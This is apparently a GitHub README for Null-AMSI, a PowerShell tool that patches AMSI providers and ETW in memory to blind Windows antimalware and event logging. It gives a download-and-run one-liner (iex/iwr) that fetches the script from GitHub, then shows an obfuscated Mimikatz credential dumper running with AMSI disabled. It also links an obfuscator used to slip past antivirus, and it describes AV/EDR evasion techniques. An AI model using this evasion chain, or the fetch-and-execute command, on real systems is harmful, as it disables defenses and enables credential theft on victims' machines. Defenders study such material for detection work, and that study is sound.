[![Telegram](https://badgen.net/badge/icon/telegram?icon=telegram&label)](https://t.me/MalwareBit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/BlackShell256/Null-AMSI/blob/main/LICENSE)
[![LinkedIn](https://img.shields.io/static/v1.svg?label=LinkedIn&message=@anibal&logo=linkedin&style=flat&color=blue)](https://www.linkedin.com/in/anibal-5a3870278/)

# Null-AMSI

## Description
The Null-AMS script is a tool that takes advantage of native PowerShell features and .NET functions using reflection, in order to modify the memory of amsi.dll, to disable its malware scanning and be free to execute scripts and malicious code. This tool is for educational use to understand the role of AMSI in protecting against malware and the implications of bypassing these defense mechanisms.

### AMSI
AMSI (Antimalware Scan Interface) is an application programming interface (API) developed by Microsoft that allows Windows applications and services to interact with third-party antivirus and antimalware software to detect and block malicious activity. AMSI was introduced in Windows 10 and is designed to improve security by allowing code, such as scripts, macros, and other potentially dangerous elements, to be scanned for malicious patterns before executing.

![image](https://github.com/user-attachments/assets/fa9ae24f-cbaa-4340-8010-536ad5949d0f)

### Reflection
Reflection in PowerShell refers to the ability to inspect and manipulate data types (such as classes, methods, properties and fields) at runtime, without needing to know their definition at compile time. This functionality is based on the .NET reflection system, which allows scripts and programs to access type and object metadata, make dynamic method calls, and modify properties or fields through reflection.

Amsi patches usually use Add-Type to add .NET types inside PowerShell, this method for AV or EDR is highly detected.
![image](https://github.com/user-attachments/assets/c03ec594-8b45-4af5-93ec-7f699d401619)

To avoid this, Null-AMSI uses reflection and use native functions, with this we can get the address of GetModuleHandle and GetProcAddress, we can use these functions to patch AMSI without alerting AV/EDR.

### Features
- *Native Memory Manipulation*: Null-AMSI uses functions from the “System.Runtime.InteropServices.Marshal” assembly to manipulate memory avoiding the use of ReadProcessMemory or WriteProcessMemory which are highly scrutinized by security measures.
  
- *All in memory*: The tool works in memory, when using "Add-Type" this function compiles the code into a C# dll, at that time your patch can be highly detected by an AV/EDR, this is avoided with reflection and kept in memory with stealth.
  
- *Effective patch bypass*: In contrast to traditional AMSI evasion techniques, which typically patch AmsiScanBuffer (highly flaged and documented) Null-AMSI patches AMSI providers, which guarantees a higher success rate against AV/EDR engines.

- *Multi-Architecture*: Works for both 32-bit and 64-bit PowerShell, to run in any environment, for this it checks the length in bytes of the IntPtr data type.

- *Evasion in memory modification*: By modifying the memory address permissions of AMSI providers and **EtwEventWrite** using the **VirtualProtect** function, **PAGE_EXECUTE_WRITECOPY** protection is employed, an uncommon configuration that favors evasion of security mechanisms. This protection contributes to the patch's effectiveness by allowing memory modifications to be made in a way that is more difficult for security tools to detect.

### ETW Patching
ETW (Event Tracing for Windows) is Microsoft's real-time event tracing and collection infrastructure for logging, monitoring and analyzing operating system and application events in Windows at the Kernel level. In the context of computer security and threat detection, ETW is a very valuable tool for Antivirus (AV) and Endpoint Detection and Response (EDR) solutions, as it provides detailed information about system activities that may be indicative of malicious behavior. Null-AMSI patches EtwEventWrite (optionally) by returning the execution flow to the next instruction.

## Use

To Use Null-AMSI, run the following commands:

With this command we will execute Null-AMSI in memory 
```
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/NullAMSI.ps1)
```
For AMSI patching only
```
Invoke-NullAMSI
```
For AMSI and ETW patching
```
Invoke-NullAMSI -etw
```
To get verbose and more information about the tool
```
Invoke-NullAMSI -v
```

### Usage example
1. Run the Null-AMSI tool, I added verbose flags and ETW patch (optional).
![image](https://github.com/user-attachments/assets/6f5ee3f1-0c93-4d23-9388-57135abd6506)

2. Now we can run Mimikatz with amsi disabled, I used an obfuscated version of Mimikatz ([Mimikatz-Obfuscated](https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Invoke-Mimikatz.ps1)) with zlib and base64 to avoid the http detection of my Eset Premium AV.
To obfuscate use: https://github.com/BlackShell256/Null-AMSI/blob/main/NullObfuscate.py (python3 NullObfuscate.py -f Invoke-Mimikatz.ps1 -o Obfuscated-Mimikatz.ps1)
![image](https://github.com/user-attachments/assets/caed0aae-ab4e-4d24-8761-52a03fd1a31f)

### Poc Evasion
[Full Video](https://www.linkedin.com/posts/anibal-5a3870278_evasion-bypass-amsi-activity-7264104326703329280-S8Y9?utm_source=share&utm_medium=member_desktop)
![image](https://github.com/user-attachments/assets/6c832166-92b5-446a-893c-273249cd68a8)

### Poc Evasion 2
[Full Video](https://www.linkedin.com/posts/anibal-5a3870278_evasion-bypass-amsi-activity-7264104326703329280-S8Y9?utm_source=share&utm_medium=member_desktop)
![image](https://github.com/user-attachments/assets/c40466b1-6a05-4941-9530-0520723b1fa3)


## Credit

* Some of the Reflection code I learned from Matt Graeber. [X/Twitter](https://x.com/mattifestation)

* Patch by Maor Korkos [X/Twitter](https://x.com/maorkor)

